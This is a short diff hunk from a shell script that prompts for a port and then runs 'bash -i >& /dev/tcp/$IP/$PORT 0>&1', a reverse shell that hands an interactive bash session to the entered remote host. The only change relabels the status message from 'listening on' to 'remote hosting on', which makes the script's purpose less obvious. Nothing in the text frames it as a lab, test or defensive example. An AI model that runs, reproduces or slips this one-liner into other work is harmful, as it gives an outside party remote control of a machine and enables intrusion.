@@ -23,7 +23,7 @@ read PORT
 
 clear;
 
-printf "\n\e[1;36mlistening on $IP/$PORT ...\e[0m"
+printf "\n\e[1;36m remote hosting on $IP/$PORT ...\e[0m"
 	bash -i >& /dev/tcp/$IP/$PORT 0>&1
 
 	return 0;
